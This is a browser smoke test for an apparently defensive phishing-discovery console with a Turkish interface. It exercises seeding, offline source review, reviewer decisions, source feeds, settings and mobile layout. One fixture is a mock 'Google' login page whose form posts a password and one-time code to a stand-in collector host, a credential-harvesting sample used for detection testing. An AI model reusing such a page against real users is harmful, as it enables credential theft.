"""Browser smoke test against a disposable, paused discovery console."""
import argparse
import uuid
from pathlib import Path

from playwright.sync_api import expect, sync_playwright

parser = argparse.ArgumentParser()
parser.add_argument('--url', default='http://127.0.0.1:8011')
parser.add_argument('--browser', required=True)
parser.add_argument('--output', default='/tmp/aegis-discovery-ui')
args = parser.parse_args()
output = Path(args.output)
output.mkdir(parents=True, exist_ok=True)
identity = uuid.uuid4().hex[:8]
with sync_playwright() as p:
    browser = p.chromium.launch(executable_path=args.browser, headless=True)
    page = browser.new_page(viewport={'width': 1440, 'height': 1000})
    errors, external = [], []
    page.on('pageerror', lambda error: errors.append(str(error)))
    page.on('request', lambda req: external.append(req.url) if not req.url.startswith(args.url) else None)
    page.goto(args.url, wait_until='networkidle')
    expect(page.get_by_role('button', name='Keşfi başlat')).to_be_visible()
    page.get_by_label('Taranacak adresler').fill(f'https://seed-{identity}.example/login')
    page.get_by_role('button', name='Aday ekle', exact=True).click()
    expect(page.get_by_text(f'seed-{identity}.example', exact=True)).to_be_visible()
    page.screenshot(path=str(output / 'desktop.png'), full_page=True)
    page.get_by_role('button', name='Kaynak kodu incele', exact=True).click()
    page.get_by_label('Sayfanın tam adresi').fill(f'https://snapshot-{identity}.example/login?token=secret')
    page.get_by_label('HTML kaynak kodu').fill('<title>Google hesap doğrulama</title><body>Google giriş<form action="https://collector.example/save" method="post"><input type="password"><input name="otp"></form></body>')
    page.get_by_role('button', name='Kaynak kodunu incele', exact=True).click()
    expect(page.get_by_role('heading', name=f'snapshot-{identity}.example')).to_be_visible()
    page.get_by_label('Karar gerekçesi').fill('Çevrimdışı deneme örneği; yayınlanmayacak.')
    expect(page.get_by_role('button', name='Phishing olarak onayla')).to_be_disabled()
    assert 'secret' not in page.locator('body').inner_text()
    page.screenshot(path=str(output / 'evidence.png'), full_page=True)
    page.get_by_role('button', name='Yanlış pozitif / geri çek').click()
    expect(page.get_by_text('Çevrimdışı deneme örneği; yayınlanmayacak.', exact=True)).to_be_visible()
    page.get_by_role('button', name='Kaynaklar', exact=True).click()
    page.get_by_label('Kaynak adı', exact=True).fill('Test ' + identity)
    page.get_by_label('Kaynak adresi', exact=True).fill('https://feed.example/urls.txt')
    page.get_by_role('button', name='Kaynağı ekle').click()
    expect(page.get_by_text('Test ' + identity, exact=True)).to_be_visible()
    page.get_by_role('button', name='Kaldır', exact=True).last.click()
    expect(page.get_by_text('Test ' + identity, exact=True)).to_have_count(0)
    page.get_by_role('button', name='Ayarlar', exact=True).click()
    page.get_by_label('Hariç tutulan alanlar').fill('excluded.example')
    page.get_by_role('button', name='Ayarları kaydet').click()
    expect(page.get_by_text('Ayarlar kaydedildi.', exact=True)).to_be_visible()
    page.get_by_role('button', name='Aday kuyruğu', exact=True).click()
    page.set_viewport_size({'width': 390, 'height': 844})
    assert page.evaluate('document.documentElement.scrollWidth <= innerWidth')
    page.screenshot(path=str(output / 'mobile.png'), full_page=True)
    expect(page.get_by_role('button', name='Keşfi başlat')).to_be_visible()
    assert not errors, errors
    assert not external, external
    browser.close()
print('Discovery UI: seeds, offline analysis, review, sources, settings, mobile and no external requests passed.')
